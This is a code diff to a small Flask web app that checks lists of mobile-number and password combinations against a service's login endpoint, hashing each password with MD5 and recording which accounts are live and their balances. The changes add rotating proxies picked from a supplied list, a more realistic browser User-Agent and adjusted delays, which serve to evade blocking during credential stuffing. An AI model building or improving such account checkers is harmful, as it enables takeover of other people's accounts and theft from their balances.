@@ -2,6 +2,7 @@ from flask import Flask, render_template, request, jsonify
 import requests
 import hashlib
 import time
+import random
 
 app = Flask(__name__)
 
@@ -18,7 +19,9 @@ def home():
 def check():
     data = request.json
     combos = data.get('combos', '').strip().splitlines()
-    
+    use_proxy = data.get('use_proxy', False)
+    proxy_list = data.get('proxies', '').strip().splitlines()
+
     results = []
     live = 0
 
@@ -34,16 +37,23 @@ def check():
 
         hashed = md5(password)
 
-        headers = {"User-Agent": "Mozilla/5.0"}
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
 
         params = {"mobile": mobile, "password": hashed}
+
+        proxy_dict = None
+        if use_proxy and proxy_list:
+            proxy = random.choice([p.strip() for p in proxy_list if p.strip()])
+            if proxy:
+                proxy_dict = {"http": proxy, "https": proxy}
 
         status = "ERROR"
         balance = "-"
         remark = "Unknown Error"
 
         try:
-            r = requests.post(BASE + "login", params=params, headers=headers, timeout=12)
+            r = requests.post(BASE + "login", params=params, headers=headers, 
+                            proxies=proxy_dict, timeout=15)
             
             if r.status_code == 200:
                 res = r.json()
@@ -62,7 +72,7 @@ def check():
             remark = str(e)
 
         results.append([mobile, status, balance, remark])
-        time.sleep(2.5)
+        time.sleep(3 if use_proxy else 2)
 
     return jsonify({
         "status": "done",
